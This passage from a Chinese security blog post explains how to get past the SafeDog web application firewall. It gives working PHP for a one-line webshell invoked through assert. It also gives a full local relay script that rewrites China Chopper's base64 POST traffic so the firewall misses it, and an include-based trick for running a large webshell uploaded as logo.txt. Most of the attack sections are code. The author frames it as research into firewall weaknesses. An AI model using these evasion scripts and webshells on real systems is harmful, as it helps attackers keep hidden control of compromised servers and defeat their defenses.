+<p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-2569-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-2569-20140701.jpg" alt="1457265662-2569-20140701"></a></p>
+<p>成功执行了系统命令，当然也可以执行php代码：</p>
+<pre class="prettyprint lang-php prettyprinted" style="color: #666666;"><span class="pln" style="color: #48484c;">http</span><span class="pun" style="color: #93a1a1;">:</span><span class="com" style="color: #93a1a1;">//192.168.200.115/small.php?a=assert&amp;b=phpinfo();</span></pre>
+
+<p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265663-7706-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265663-7706-20140701.jpg" alt="1457265663-7706-20140701"></a></p>
+<h1 id="六、菜刀绕过"><a href="#六、菜刀绕过" class="headerlink" title="六、菜刀绕过"></a>六、菜刀绕过</h1><pre><code>测试发现这种一句话虽然可以成功执行，但是在菜刀里却不能用，而有些人非觉得这样的一句话麻烦，非要用菜刀。经分析安全狗对菜刀的HTTP请求做了拦截，菜刀的POST数据里面对eval数据做了base64编码，安全狗也就依靠对这些特征来拦截，因此要想正常使用菜刀，必须在本地做一个转发，先把有特征的数据转换。这个思路类似于对伪静态注入的本地转发。
+
+首先在本地搭建WEB SERVER，然后写一个php转发程序：
+</code></pre><pre class="prettyprint lang-php prettyprinted" style="color: #666666;"><span class="pun" style="color: #93a1a1;">&lt;?</span><span class="pln" style="color: #48484c;">php
+$target</span><span class="pun" style="color: #93a1a1;">=</span><span class="str" style="color: #dd1144;">"http://192.168.200.115/small.php"</span><span class="pun" style="color: #93a1a1;">;</span><span class="com" style="color: #93a1a1;">//这个就是前面那个一句话的地址</span><span class="pln" style="color: #48484c;">
+$poststr</span><span class="pun" style="color: #93a1a1;">=</span><span class="str" style="color: #dd1144;">''</span><span class="pun" style="color: #93a1a1;">;</span><span class="pln" style="color: #48484c;">
+$i</span><span class="pun" style="color: #93a1a1;">=</span><span class="lit" style="color: #195f91;">0</span><span class="pun" style="color: #93a1a1;">;</span><span class="kwd" style="color: #1e347b;">foreach</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$_POST </span><span class="kwd" style="color: #1e347b;">as</span><span class="pln" style="color: #48484c;"> $k</span><span class="pun" style="color: #93a1a1;">=&gt;</span><span class="pln" style="color: #48484c;">$v</span><span class="pun" style="color: #93a1a1;">)</span><span class="pun" style="color: #93a1a1;">{</span><span class="pln" style="color: #48484c;">
+  </span><span class="kwd" style="color: #1e347b;">if</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">strstr</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$v</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;"> </span><span class="str" style="color: #dd1144;">"base64_decode"</span><span class="pun" style="color: #93a1a1;">))</span><span class="pln" style="color: #48484c;">
+  </span><span class="pun" style="color: #93a1a1;">{</span><span class="pln" style="color: #48484c;">
+    $v</span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;">str_replace</span><span class="pun" style="color: #93a1a1;">(</span><span class="str" style="color: #dd1144;">"base64_decode("</span><span class="pun" style="color: #93a1a1;">,</span><span class="str" style="color: #dd1144;">""</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;">$v</span><span class="pun" style="color: #93a1a1;">);</span><span class="pln" style="color: #48484c;">
+    $v</span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;">str_replace</span><span class="pun" style="color: #93a1a1;">(</span><span class="str" style="color: #dd1144;">"))"</span><span class="pun" style="color: #93a1a1;">,</span><span class="str" style="color: #dd1144;">")"</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;">$v</span><span class="pun" style="color: #93a1a1;">);</span><span class="pln" style="color: #48484c;">
+  </span><span class="pun" style="color: #93a1a1;">}</span><span class="pln" style="color: #48484c;">
+  </span><span class="kwd" style="color: #1e347b;">else</span><span class="pln" style="color: #48484c;">
+  </span><span class="pun" style="color: #93a1a1;">{</span><span class="pln" style="color: #48484c;">
+    </span><span class="kwd" style="color: #1e347b;">if</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$k</span><span class="pun" style="color: #93a1a1;">===</span><span class="str" style="color: #dd1144;">"z0"</span><span class="pun" style="color: #93a1a1;">)</span><span class="pln" style="color: #48484c;">
+      $v</span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;">base64_decode</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$v</span><span class="pun" style="color: #93a1a1;">);</span><span class="pln" style="color: #48484c;">
+  </span><span class="pun" style="color: #93a1a1;">}</span><span class="pln" style="color: #48484c;">
+  $pp</span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;">$k</span><span class="pun" style="color: #93a1a1;">.</span><span class="str" style="color: #dd1144;">"="</span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;">urlencode</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$v</span><span class="pun" style="color: #93a1a1;">);</span><span class="pln" style="color: #48484c;">
+  </span><span class="com" style="color: #93a1a1;">//echo($pp);</span><span class="pln" style="color: #48484c;">
+  </span><span class="kwd" style="color: #1e347b;">if</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$i</span><span class="pun" style="color: #93a1a1;">!=</span><span class="lit" style="color: #195f91;">0</span><span class="pun" style="color: #93a1a1;">)</span><span class="pln" style="color: #48484c;">
+  </span><span class="pun" style="color: #93a1a1;">{</span><span class="pln" style="color: #48484c;">
+    $poststr</span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;">$poststr</span><span class="pun" style="color: #93a1a1;">.</span><span class="str" style="color: #dd1144;">"&amp;"</span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;">$pp</span><span class="pun" style="color: #93a1a1;">;</span><span class="pln" style="color: #48484c;">
+  </span><span class="pun" style="color: #93a1a1;">}</span><span class="pln" style="color: #48484c;">
+  </span><span class="kwd" style="color: #1e347b;">else</span><span class="pln" style="color: #48484c;">
+  </span><span class="pun" style="color: #93a1a1;">{</span><span class="pln" style="color: #48484c;">  
+    $poststr</span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;">$pp</span><span class="pun" style="color: #93a1a1;">;</span><span class="pln" style="color: #48484c;">
+  </span><span class="pun" style="color: #93a1a1;">}</span><span class="pln" style="color: #48484c;">
+  $i</span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;">$i</span><span class="pun" style="color: #93a1a1;">+</span><span class="lit" style="color: #195f91;">1</span><span class="pun" style="color: #93a1a1;">;</span><span class="pun" style="color: #93a1a1;">}</span><span class="pln" style="color: #48484c;">
+$ch </span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;"> curl_init</span><span class="pun" style="color: #93a1a1;">();</span><span class="pln" style="color: #48484c;">
+$curl_url </span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;"> $target</span><span class="pun" style="color: #93a1a1;">.</span><span class="str" style="color: #dd1144;">"?"</span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;">$_SERVER</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">'QUERY_STRING'</span><span class="pun" style="color: #93a1a1;">];</span><span class="pln" style="color: #48484c;">
+curl_setopt</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$ch</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;"> CURLOPT_URL</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;"> $curl_url</span><span class="pun" style="color: #93a1a1;">);</span><span class="pln" style="color: #48484c;">
+curl_setopt</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$ch</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;"> CURLOPT_POST</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;"> </span><span class="lit" style="color: #195f91;">1</span><span class="pun" style="color: #93a1a1;">);</span><span class="pln" style="color: #48484c;">
+curl_setopt</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$ch</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;"> CURLOPT_POSTFIELDS</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;"> $poststr</span><span class="pun" style="color: #93a1a1;">);</span><span class="pln" style="color: #48484c;">
+curl_setopt</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$ch</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;"> CURLOPT_RETURNTRANSFER</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;"> </span><span class="lit" style="color: #195f91;">1</span><span class="pun" style="color: #93a1a1;">);</span><span class="pln" style="color: #48484c;">
+$result </span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;"> curl_exec</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$ch</span><span class="pun" style="color: #93a1a1;">);</span><span class="pln" style="color: #48484c;">
+curl_close</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$ch</span><span class="pun" style="color: #93a1a1;">);</span><span class="pln" style="color: #48484c;">
+echo $result</span><span class="pun" style="color: #93a1a1;">;</span><span class="pun" style="color: #93a1a1;">?&gt;</span></pre>
+
+<p>意思就是在本地先对eval数据进行base64解码，然后再POST到目标机器上去。在菜刀里设置URL为本地转发php脚本:</p>
+<p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265663-7688-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265663-7688-20140701.jpg" alt="1457265663-7688-20140701"></a></p>
+<p>这样就可以使用菜刀来连接前面那个一句话马了:</p>
+<p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265664-4813-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265664-4813-20140701.jpg" alt="1457265664-4813-20140701"></a></p>
+<pre><code>这样就能用菜刀了，不过大家真的没必要执着于菜刀，向大家推荐一款更好的类似菜刀的工具Altman：
+</code></pre><p><a href="http://www.i0day.com/1725.html" target="_blank" rel="noopener">http://www.i0day.com/1725.html</a></p>
+<pre><code>它的最大特点是开源，这意味着像安全狗这种根据特征来拦截的，只要改改源代码把特征字符串改掉，就永远也无法拦截。当然改这个代码要你自己动手喽。
+</code></pre><h1 id="七、webshell大马绕过"><a href="#七、webshell大马绕过" class="headerlink" title="七、webshell大马绕过"></a>七、webshell大马绕过</h1><p>一句话功能毕竟有限，想用大马怎么办？仍然是传统的include大法，传一个big.php内容如下：</p>
+<pre class="prettyprint lang-php prettyprinted" style="color: #666666;"><span class="pun" style="color: #93a1a1;">&lt;?</span><span class="pln" style="color: #48484c;">php
+include</span><span class="pun" style="color: #93a1a1;">(</span><span class="str" style="color: #dd1144;">'logo.txt'</span><span class="pun" style="color: #93a1a1;">);</span><span class="pun" style="color: #93a1a1;">?&gt;</span></pre>
+
+<p>然后再把大马上传为logo.txt，这样就成功绕过安全狗的拦截执行了webshell：</p>
+<p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265664-6560-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265664-6560-20140701.jpg" alt="1457265664-6560-20140701"></a></p>
+<p>这样大马也顺利执行了。</p>
+<h1 id="八、结束语"><a href="#八、结束语" class="headerlink" title="八、结束语"></a>八、结束语</h1><pre><code>上面从SQL注入、上传、webshell等几个方面绕过了安全狗的保护，有些绕过方法安全狗可能早就知道了，但是为什么一直没有补？很可能的原因是怕过滤太严格影响某些应用，在安全和通用性之间做取舍我认为是可以理解的，但是我觉得这也正是安全研究人员存在的价值所在。
+
+这里发几句题外的牢骚，很多安全公司其实是当作软件公司来做的，做安全软件就是去做开发，而忽视了安全研究的价值。普通的防护方法原理很简单，但想要不影响应用又保证安全其实很难，如果没有对漏洞和攻击有深入理解的研究人员，安全产品是没法更上一层楼的。希望各个安全公司不要太功利，对研究人员多一些重视，安全公司真的不能仅仅等同于软件公司啊！
+</code></pre>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/133.html?day=20171116" rel="next" title="分享一个十分钟邮箱-临时邮箱">
+                <i class="fa fa-chevron-left"></i> 分享一个十分钟邮箱-临时邮箱
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/144.html?day=20171116" rel="prev" title="find 查找PHP后门">
+                find 查找PHP后门 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="SOHUCS"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Lost Maniac" />
+            
+              <p class="site-author-name" itemprop="name">Lost Maniac</p>
+              <p class="site-description motion-element" itemprop="description">随便写写</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">79</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/rss.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/MSG-maniac" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:semowansui@vip.qq.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://qs5.org/" title="青石坞" target="_blank">青石坞</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bejson.com/" title="bejson" target="_blank">bejson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.hellojava.com/" title="HelloJava" target="_blank">HelloJava</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一、前言"><span class="nav-number">1.</span> <span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二、测试环境"><span class="nav-number">2.</span> <span class="nav-text">二、测试环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#三、SQL注入绕过"><span class="nav-number">3.</span> <span class="nav-text">三、SQL注入绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#四、文件上传绕过"><span class="nav-number">4.</span> <span class="nav-text">四、文件上传绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#五、一句话webshell绕过"><span class="nav-number">5.</span> <span class="nav-text">五、一句话webshell绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#六、菜刀绕过"><span class="nav-number">6.</span> <span class="nav-text">六、菜刀绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#七、webshell大马绕过"><span class="nav-number">7.</span> <span class="nav-text">七、webshell大马绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#八、结束语"><span class="nav-number">8.</span> <span class="nav-text">八、结束语</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2013 &mdash; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">色魔科技</span>
+
+  
+  <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+    <script type="text/javascript">
+    (function(){
+      var appid = 'cytjBrzIY';
+      var conf = 'e3ae49b68dbe1a48b4fee1de4e87cc06';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      if (width < 960) {
+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+        window.changyan.api.config({appid:appid,conf:conf})});
+      }
+    })();
+    </script>
+    <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+  
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
